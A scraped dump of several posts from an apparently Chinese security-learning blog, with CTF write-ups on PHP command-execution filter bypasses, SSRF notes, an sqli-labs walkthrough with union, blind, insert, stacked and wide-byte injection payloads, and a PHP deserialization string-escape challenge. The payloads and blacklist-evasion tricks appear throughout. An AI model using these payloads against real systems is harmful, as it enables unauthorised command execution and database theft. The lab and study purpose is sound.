38又过滤php ，file 使用data协议 39if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c)){ include($c.&quot;php&quot;); echo $flag; } }else{ highlight_file(__FILE__); } payload c=data:text/plain,&lt;?php system(&#39;cat f*&#39;)?&gt; 这样就相当于执行了php语句&lt;?php system(&#39;cat f*&#39;)?&gt;.php 因为前面的php语句已经闭合了，所以后面的.php会被当成html页面直接显示在页面上，起不到什么作用。 40 无参函数绕过if(isset($_GET[&#39;c&#39;])){ $c = $_GET[&#39;c&#39;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\&#39;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } 禁掉了 \\不能用伪协议 禁掉了 ` 不能使用echo 禁掉了 ”“ 和 ‘ ’ ,[ ] 不能使用带参数的函数（正则表达式里面ban的是中文括号） 这里使用无参RCE 遍历目录 print_r(scandir(current(localeconv()))); show_source(array_rand(array_flip(scandir(current(localeconv()))))); show_source(next(array_reverse(scandir(current(localeconv()))))); 也可以使用 session_id(session_start()),但是没有成功，因为session_id规定为0-9，a-z,A-Z,-中的字符 41 未解出42与43相同 43 绕过 &gt;/dev/null 2&gt;&amp;1if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|cat/i&quot;, $c)){ system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); } }else{ highlight_file(__FILE__); } 这里有一个&gt;/dev/null 2&gt;&amp;1 参考链接:https://www.cnblogs.com/ultranms/p/9353157.html 总之就是将输出丢弃 这里可以利用换行符绕过,也可以使用|| c=ls%0a c=c\\at flag.php%0a 47又过滤了几个查看文件命令 nl%09fla?.php%0a 50if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c)){ system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); } }else{ highlight_file(__FILE__); } nl&lt;&gt;fla\\g.php%0a 52if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c)){ system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); } }else{ highlight_file(__FILE__); } 又ban掉了&lt;&gt; 换一个空格绕过 nl${IFS}fl?g.php%0a 54 /bin/?at 绕过if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c)){ system($c); } }else{ highlight_file(__FILE__); } ?c=paste${IFS}fla?.php%0a ?c=/bin/?at${IFS}f?ag.php%0a ?c=/bin/?at${IFS}f?????? 这里要注意有的时候可能会被意外截获 比如如果你用 /bin/?at${IFS}fl??.php%0a 那就会被.\\*n.\\*l.*栏下 还有可能是环境问题 /bin/past?${IFS}flag.php,在本地是能够运行的但是在此题当中却出不来结果 /bin 目录是存指令的地方 55 过滤所有小写字母if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c)){ system($c); } }else{ highlight_file(__FILE__); } 过滤了所有小写字符,但是没有过滤通配符，可以使用带数字的命令绕过 base64的使用 有个命令是/bin/base64，我们可以据此构造 ?c=/???/????64 ???????? 得到 PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMg QERhdGU6ICAgMjAyMC0wOS0wNyAxOTo0MDo1Mw0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhh DQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDcgMTk6NDE6MDANCiMgQGVtYWlsOiBo MXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxh Zz0iZmxhZ3tlYTY0MTJlZi03NGY3LTQ1ZjItYWJiYS05M2Y2ODZkOTkwZDh9Ijs= 解码即得到flag. bzip2 bzip2 是 linux 下面的压缩文件的命令。在/usr/bin/bzip2 构造 ?C=/???/???/????2 ???????? 然后访问flag.php.bz2下载即可获得 flag.php 56 过滤所有大小写字母+数字// 你们在炫技吗？ if(isset($_GET[&#39;c&#39;])){ $c=$_GET[&#39;c&#39;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\&#39;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c)){ system($c); } }else{ highlight_file(__FILE__); } 越到后面越神仙了,全都不会做,这题过滤了字母加数字,但是没有过滤运算符, 参考文章:不包含数字和字母的webshell： https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 这里提供两种方法: 1.通过位运算符构造payload 2.利用自增运算符构造payload 但是自己做的话我觉得是要写一个python脚本来算的,就先留在这里,过几天来写 就先做到这里,剩下的过几天再来做","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"rce","slug":"rce","permalink":"https://pp1ove.gitee.io/tags/rce/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"ssrf","slug":"ssrf","date":"2021-01-24T01:48:04.000Z","updated":"2021-01-31T01:23:07.368Z","comments":false,"path":"2021/01/24/ssrf/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/24/ssrf/","excerpt":"","text":"常用协议file:/// dict:// sftp:// ldap:// tftp:// gopher:// 参考链接:https://www.cnblogs.com/-mo-/p/11673190.html gopher协议:https://blog.csdn.net/qq_45089570/article/details/109643457 https://blog.csdn.net/Z_Grant/article/details/102913575?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control https://www.cnblogs.com/flokz/p/11610048.html#autoid-3-0-0 引起SSRF漏洞的函数file_get_contents() 获取文件内容 fscockopen() 打开一个网络连接或者一个Unix套接字连接 curl_exec() 执行curl绘画,最好用的,几乎可以用来做各种ssrf攻击 redis下载redis,修改 https://www.evi1s.com/archives/140/","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://pp1ove.gitee.io/tags/ssrf/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"sqli-lab","slug":"sqlilabs","date":"2021-01-17T11:33:15.000Z","updated":"2021-02-07T14:09:38.404Z","comments":false,"path":"2021/01/17/sqlilabs/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/17/sqlilabs/","excerpt":"","text":"less 1-4 union未进行任何处理,直接union注入 less 5-6 盲注,报错$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#39;; echo &#39;You are in...........&#39;; //没有回显,盲注 echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;; print_r(mysql_error()); //输出报错信息,可能会产生报错注入 echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#39;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#39;; } } regexp 正则注入除了常见的时间盲注,布尔盲注,正则注入介绍：http://www.cnblogs.com/lcamry/articles/5717442.html like匹配注入也和正则注入类似 less 7 文件需要说一下这个方法需要mysql数据库开启secure-file-priv写文件权限，否则不能写入文件。 如果你使用的时phpstudy，或者xammp请修改其自己的环境里的mysql配置文件。 进入mysql安装目录，找到my.ini 修改里面的secure-file-priv参数 如果发现没有secure_file_priv这个选项，直接再最后添加一个空的即可。 如果引号中是一个文件路径的话，导入/出的文件路径会再这个路径下。 相关函数：load_file()导出文件 load date infile select……into outfile ‘file_name’ less 8-10 盲注跟5,6的源码一样,只是注释掉了print_r(mysql_error()); 导致不能使用报错注入 less 11-14 union post平平无奇的post 后端代码：@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;; less 15-16 时间盲注less 17源码很有意思,使用了一个function check_input($value)函数来检测输入是否合法 function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); //限制字符串长度 } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) //检查字符串里的字符是不是都是数字,是返回true，不是返回false。 { $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;//函数转义 SQL 语句中使用的字符串中的特殊字符。 } else { $value = intval($value); } return $value; } 感觉挺复杂的,不知道以后能不能绕过这个函数 然后看后面,因为passwd没有进行过滤,并且后面输出了报错信息,可以使用报错注入, 若没有报错信息,还可以使用update注入,update参数可控, update users set password=‘1’ ,id=’xxx’ where username=’admin’; 可以更改多个字段数据 less 18,19 $sql=&quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) { echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#39;; $insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;; echo &quot;$uagent&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;$insert&quot;; mysql_query($insert); //echo &#39;Your IP ADDRESS is: &#39; .$IP; echo &quot;&lt;/font&gt;&quot;; //echo &quot;&lt;br&gt;&quot;; echo &#39;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#39;; echo &#39;Your User Agent is: &#39; .$uagent; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; print_r(mysql_error()); //输出报错信息 echo &quot;&lt;br&gt;&lt;br&gt;&quot;; echo &#39;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#39;; echo &quot;&lt;br&gt;&quot;; } else { echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;; echo &quot;&lt;/font&gt;&quot;; } 因为输出了报错信息,所以可以报错注入 此外,INSERT参数可控还有以下注入方式 inert注入1.注入点位于tbl_name原句：insert into {tbl_name} values(2,2,2,2); 注入：insert into {wp_user values(2,&#39;newadmin&#39;,&#39;newpasswd&#39;)#} values(2,2,2,2); 2.注入点位于valuesINSERT INTO wp_user VALUES(1,1,{xxxxx}); INSERT INTO wp_user VALUES(1,1,1),(2,1,&quot;aaaaa&quot;); //第二个字段若为管理员标识符,便可以添加管理员 INSERT INTO wp_user VALUES(1,1,1),(2,2,(select pwd from wp_user limit 1)); //最后一个字段可以显示 less 20-22关于cookie的,会把cookie存入数据库,然后再次访问时取出 less 23加了替换,将#和–注释符给替换掉了 $reg = &quot;/#/&quot;; $reg1 = &quot;/--/&quot;; $replace = &quot;&quot;; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id); 这里直接给出payload:0&#39; union select 1,2,3 and &#39;1&#39;=&#39;1 可以自己手动闭合后面的单引号 less 24二次注入:开发者信任数据库中取出的数据是无害的，当我们引用数据库里的数据时,造成了二次注入 这里我们创建了用户admin’#，然后在修改密码后,却把admin的密码给修改了 源码: $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;; less 25function blacklist($id) { $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id); //Strip out AND (non case sensitive) return $id; } 将or和and替换为了空,可以采用双写绕过,或者可以采用&amp;&amp;和|| 1%27%20aandnd%201–%20- less 26function blacklist($id) { $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id); //strip out OR (non case sensitive) $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id); //Strip out AND (non case sensitive) $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out -- $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out # $id= preg_replace(&#39;/[\\s]/&#39;,&quot;&quot;, $id); //Strip out spaces $id= preg_replace(&#39;/[\\/\\\\\\\\]/&#39;,&quot;&quot;, $id); //Strip out slashes 斜杠 return $id; } 好家伙,又过滤了斜杠和空格,但是空格有很多种方式绕过 如URL编码: %0a,%0b,%0c,%0d,%09,%a0 /**/组合 括号 这里需要linux环境才能使用这些特殊字符串,因为我是在windows下搭的,就懒得本地测试了 less 27function blacklist($id) { $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id); //Strip out union $id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id); //Strip out select $id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id); //Strip out UNION $id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id); //Strip out SELECT $id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id); //Strip out Union $id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id); //Strip out select return $id; } 又过滤了union和select,依旧双写,而且似乎可以大小写绕过 less 28function blacklist($id) { $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. //$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); //Strip out UNION &amp; SELECT. return $id; } 过滤了union+select组合,因为替换为空,仍然双写绕过 union union select select 又或者 使用盲注 less 29-31 一个简单的waf又没做,因为好像要搭环境(人太懒了) less 32 -34宽字节注入因此我们在此想办法将 ‘ 前面添加的 \\ 除掉，一般有两种思路： 1、%df 吃掉 \\ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。 2、将 \\’ 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法。 使用UTF-16编码 function check_addslashes($string) { $string = preg_replace(&#39;/&#39;. preg_quote(&#39;\\\\&#39;) .&#39;/&#39;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#39;/\\&#39;/i&#39;, &#39;\\\\\\&#39;&#39;, $string); //escape single quote with a backslash $string = preg_replace(&#39;/\\&quot;/&#39;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string; } 这题增加了个check函数,第一个正则匹配转义了\\，然后会在&#39;和&quot;前面加上斜杠,可以使用宽字节注入 //宽字节注入的条件是支持GDK编码 payload：?id=-1%df%27 UNion seleCt 1,2,DATABASE()--+ 第33关将get改为了post请求 这里要注意如果使用宽字节注入的话需要用burp抓包,因为我们的%df中的%会被url编码,而且我直接使用repeater模块还无法看到返回结果,就很疑惑 payload：uname=admin%df&#39; union select 1,2-- -&amp;passwd=admin&amp;submit=Submit 当然还有一种方法:将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为�’ 。 宽字节注入的防护首先我们需要过滤掉\\，不然就可以可以使用第二种思路绕过 过滤斜杠后,我们依旧可以使用%df的方式进行绕过 Addslashes()函数和我们在 32 关实现的功能基本一致的，所以我们依旧可以利用%df 进行绕 过。Notice：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞。 Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn); 在PHP语言情况下 可以防止一些SQL诸如 比如我在你的登陆窗口写 “用户名”=%dc%27%20or%201=1%20limit%201%20/*&amp;amp; “密码”=88888*/%23 就有可能直接登陆你后台 但是你如果设置了SET character_set_client = binary MYSQL 就会以二进制发送 不存在宽字节注入 在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。 设置代码： Mysql_set_charset(‘gbk’,’$conn’) 要避开mysql_real_escape_string可能的风险，有以下策略 1）数据库表使用的编码与数据库变量character_set_client指定的编码相同，这样不需要set names xxx来改变编码。 2）数据库表使用latin1或utf8等字符集，这样set names xxx也不会带来额外的风险。 3）当需要set names gbk时，使用mysql_set_charset来替代。 再次分析代码,PHP客户端用的是UTF-8编码,而mysql用的是gbk编码, less 35用了addslashes 函数在指定的预定义字符前添加反斜杠。这些字符是单引号、双引号、反斜线与NULL。 $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 这题它id没有被单引号包裹,所以说addslashes函数没有作用,直接绕就行 less 36-37还是斜杠转义,可能是想给我们介绍一些不同的转义函数吧,其实绕过方法都是一样的 mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 下列字符受影响： \\x00 \\n \\r \\ &#39; &quot; \\x1a 37 post,老方法 less 38-41堆叠注入&lt;?php // take the variables if(isset($_GET[&#39;id&#39;])) { $id=$_GET[&#39;id&#39;]; //logging the connection parameters to a file for analysis. $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;); fwrite($fp,&#39;ID:&#39;.$id.&quot;\\n&quot;); fclose($fp); // connectivity //mysql connections for stacked query examples. $con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname); // Check connection if (mysqli_connect_errno($con1)) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } else { @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;); } $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;; /* execute multi query */ if (mysqli_multi_query($con1, $sql)) { /* store first result set */ if ($result = mysqli_store_result($con1)) //如果当前执行的查询存在多个结果，返回“真”，而且应用程序必须调用mysql_next_result()来获取结果。 { if($row = mysqli_fetch_row($result)) // 函数从结果集中取得一行，并作为枚举数组返回。 { var_dump($row); echo &#39;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#39;; // printf(&quot;Your Username is : %s&quot;, $row[1]); echo &quot;&lt;br&gt;&quot;; // printf(&quot;Your Password is : %s&quot;, $row[2]); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } mysqli_free_result($result); //函数释放结果内存 } /* print divider */ if (mysqli_more_results($con1)) //函数检查一个多查询是否有更多的结果。 { //printf(&quot;-----------------\\n&quot;); } //while (mysqli_next_result($con1)); //而且应用程序必须调用mysql_next_result()来获取结果。 } else { echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;; print_r(mysqli_error($con1)); echo &quot;&lt;/font&gt;&quot;; } /* close connection */ mysqli_close($con1); } mysqli_multi_query() 支持同时查询多条数据 这题无法输出第二个语句里面的内容,希望后面能遇到能输出第二个语句内容的关卡,让我对比一下两者的代码;但是第二条语句是可以执行的;可以使用insert语句将将想要的信息输入插入到users表中 payload: ?id=1%df&#39;;insert into users values(99,database(),version()); ?id=99 less 39,整形 41和39的区别 39会输出报错信息,其实可以采用报错注入 less 42进来之后是一个登录框 跟二次注入那个一模一样,但是我们不能自己new user 源码: 对username进行了mysqli_real_escape_string()函数进行检查,而且PHP客户端和数据库都是UTF-8编码,所以不存在宽字节绕过,但是它又没有对password进行处理,再password上面就存在注入 我原本都以为这是使用堆叠注入越权new一个admin’#用户来进行二次注入的,但是却用不了,原因是因为: 之前提到的username进行了mysqli_real_escape_string()函数进行过检查,虽然我们能new一个新用户,但是我们其实在登陆时本身单引号就会进行转义呀！！ less 43 换了种闭合方式,然后44，45取消了报错,所以不能使用报错注入了,只能盲注 常用闭合方式判断判断闭合方式，目前掌握的闭合方式为单引号’’，单引号括号(’’)，双引号””，双引号括号(“”) 当单引号或者双引号出现回显或者语法错误时，如何判断是否带括号呢？ 遇到SQL注入第一步判断闭合：首先尝试： ?id=1’ ?id=1” 12 1如果都报错，则为整形闭合。 2如果单引号报错，双引号不报错。然后尝试 ?id=1&#39; --+ ?id=1&#39; # 12 无报错则单引号闭合。报错则单引号加括号。 3如果单引号不报错，双引号报错。然后尝试 ?id=1&quot; --+ ?id=1&quot; # 12 无报错则双引号闭合。报错则双引号加括号。 1 输入（其中id=1,1是正确的数据库存在的值），正常回显 ?id=1 and true --+ 或者 ?id=true and true --+ 123 输入，错误回显 ?id=1 and false --+ 或者 ?id=true and false --+ 123 那么就是整形闭合 2 输入（其中id=1,1是正确的数据库存在的值），正常回显 ?id=1’ and true --+ 或者 ?id=true‘ and true --+ 123 输入，错误回显 ?id=1’ and false --+ 或者 ?id=true‘ and false --+ 123 那么就是单引号闭合，其他符号同理 单引号转义绕过当时用单引号’，代码转义为\\’，就使用如下方式替换掉单引号 %df%27 �&#39; %EF%BF%BD 123 万能密码 �&#39; and1=1 # 1 database()返回当前数据库名 version()返回数据库的版本号 CONCAT(s1,s2…sn)字符串 s1,s2 等多个字符串合并为一个字符串 CONCAT_WS(x, s1,s2…sn)同 CONCAT(s1,s2,…) 函数，但是每个字符串之间要加上 x，x 可以是分隔符 LIMITmysql&gt; SELECT * FROM table LIMIT 5,10; // 检索记录行 6-15 //为了检索从某一个偏移量到记录集的结束所有的记录行，可以指定第二个参数为 -1： mysql&gt; SELECT * FROM table LIMIT 95,-1; // 检索记录行 96-last. //如果只给定一个参数，它表示返回最大的记录行数目： mysql&gt; SELECT * FROM table LIMIT 5; //检索前 5 个记录行 //换句话说，LIMIT n 等价于 LIMIT 0,n。 123456789 sleepleftLEFT(s,n) 返回字符串 s 的前 n 个字符 返回字符串 runoob 中的前两个字符： SELECT LEFT(‘runoob’,2) – ru midmid()函数为截取字符串一部分。mid(column_name,start,length) column_name 必需，要提取字符的字段 start 必需，规定开始位置（起始为1） length 可选，要返回的字符数，如果省略则返回剩余文本 eg：str=“123456” mid(str,2,1) 结果为2 substrsubstr（） Substr()和substring()函数实现的功能是一样的，均为截取字符串。 string substring(string, start, length) string substr(string, start, length) 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度 ASCII返回字符串 s 的第一个字符的 ASCII 码。返回 CustomerName 字段第一个字母的 ASCII 码： SELECT ASCII(CustomerName) AS NumCodeOfFirstCharFROM Customers; count返回查询的记录总数，expression 参数是一个字段或者 * 号 返回 Products 表中 products 字段总共有多少条记录： SELECT COUNT(ProductID) AS NumberOfProducts FROM Products; ifIF(expr,v1,v2) 如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2SELECT IF(1 &gt; 0,‘正确’,‘错误’)-&gt;正确 updatexmlupdatexml()函数，是更新xml文档的函数。 语法updatexml(目标xml文档，xml路径，更新的内容) select username from security.user where id=1 and (updatexml(‘anything’,’/xx/xx’,’anything’))","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://pp1ove.gitee.io/tags/sql/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"反序列化字符串逃逸","slug":"反序列化字符串逃逸","date":"2021-01-17T03:19:58.000Z","updated":"2021-02-22T15:17:22.325Z","comments":false,"path":"2021/01/17/反序列化字符串逃逸/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/17/反序列化字符串逃逸/","excerpt":"","text":"PHP反序列化的对象逃逸任何具有一定结构的数据，只要经过了某些处理而把自身结构改变，则可能会产生漏洞。 若我们输入的字符串先被序列化,然后又经过过滤函数,那么它的结构将会发生改变,可能就会产生漏洞 这里利用[安洵杯 2019]easy_serialize_php来进行讲解 过滤函数引发的结构变化第一种为关键词数增加 例如： where-&gt;hacker，这样词数由五个增加到6个。题目: 0CTF 2016 piapiapia第二种为关键词数减少例如：直接过滤掉一些关键词 键逃逸和值逃逸值逃逸：这儿需要两个连续的键值对，由第一个的值覆盖第二个的键，这样第二个值就逃逸出去，单独作为一个键值对 _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&amp;function=show_image var_dump的结果为： &quot;a:3{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}&quot; 键逃逸： 这儿只需要一个键值对就行了，我们直接构造会被过滤的键，这样值得一部分充当键，剩下得一部分作为单独得键值对 _SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;} var_dump的结果为： &quot;a:2:{s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;}&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}&quot; 这儿得s:7:””之所以为空，是因为我们构造得键flagphp都是会被过滤得，所以显示为空，这样就能吃掉一部分值了，然后将剩下得值充当另一个对象逃逸出去 [安洵杯 2019]easy_serialize_php首先进去就可以看到源码 &lt;?php $function = @$_GET[&#39;f&#39;]; function filter($img){ $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;; return preg_replace($filter,&#39;&#39;,$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[&quot;user&quot;] = &#39;guest&#39;; $_SESSION[&#39;function&#39;] = $function; extract($_POST); //extract变量覆盖 if(!$function){ echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;; } if(!$_GET[&#39;img_path&#39;]){ $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;); }else{ $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;])); //sha1加密 } $serialize_info = filter(serialize($_SESSION)); if($function == &#39;highlight_file&#39;){ highlight_file(&#39;index.php&#39;); }else if($function == &#39;phpinfo&#39;){ eval(&#39;phpinfo();&#39;); //maybe you can find something in here! }else if($function == &#39;show_image&#39;){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); } 知识点 extract变量覆盖 反序列化字符串逃逸 解题首先查看phpinfo发现php.ini中设置了auto_prepend_file隐式包含了d0g3_f1ag.php,本题就是要读取该文件 0x01 extract变量覆盖extract()函数 该函数使用数组键名作为变量名，使用数组的键值作为变量值 其实本是知道这个知识点的,但是理解不够深入,导致自己一直没有利用到该知识点 